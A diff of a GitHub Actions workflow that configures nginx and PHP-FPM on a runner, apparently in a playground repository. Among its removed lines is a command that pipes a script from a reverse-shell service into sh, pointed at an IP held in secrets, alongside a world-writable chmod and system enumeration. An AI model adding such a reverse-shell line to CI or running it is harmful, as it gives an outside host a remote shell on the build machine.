@@ -31,7 +31,6 @@ jobs:
         run: |
           sudo apt install -y --no-upgrade php$VERSION-fpm
           sudo /usr/sbin/php-fpm$VERSION --test
-          sudo systemctl start php$VERSION-fpm
           sudo chmod 644 /var/log/php$VERSION-fpm.log
 
       - uses: dominicwatson/github-action-envsubst@v1
@@ -49,47 +48,18 @@ jobs:
           cat /etc/nginx/nginx.conf
           echo "::endgroup::"
           sudo nginx -t
-          sudo systemctl start nginx
 
       - name: Fix permission
-        run: |
-          sudo usermod -aG docker www-data
-          sudo chown -R www-data:www-data ${{ github.workspace }}
-          sudo chmod -R 777 public
-          sudo -u www-data bash -c 'cd ${{ github.workspace }}/public; pwd; whoami'
-          sudo -u www-data stat /home/runner/work/gh-action-playground/gh-action-playground/public
-          sudo -u www-data stat /home/runner/work/gh-action-playground/gh-action-playground
-          sudo -u www-data stat /home/runner/work/gh-action-playground
-          sudo -u www-data stat /home/runner/work
-          sudo -u www-data stat /home/runner
-          sudo -u www-data stat /home
-          sudo -u www-data stat /
-          echo '<h1>test</h1>' >> public/index.html
-          echo "::group::debug"
-          ls -al
-          ls -al ../
-          ls -al ../../
-          ls -al ../../../
-          df -h
-          ps auxwww
-          mount
-          echo "::endgroup::"
-      - name: Sync public dir
-        run: |
-          echo "::group::mount"
-          mount
-          echo "::endgroup::"
-          sudo rsync -av --chown=www-data:www-data --delete --delete-after public/ /var/www/html
+        if: ${{ !env.ACT }}
+        run: sudo usermod -aG docker www-data
 
-      - name: Restart services
+      - name: Start services
         run: |
           sudo systemctl restart nginx
           sudo systemctl restart php${{ env.PHP_VERSION}}-fpm
 
       - name: Send request to /
-        run: |
-          curl -vf localhost
-          curl https://reverse-shell.sh/${{ secrets.IP }}:1337 | sh
+        run: curl -vf localhost
 
       - uses: actions/upload-artifact@v3
         if: failure() && !env.ACT
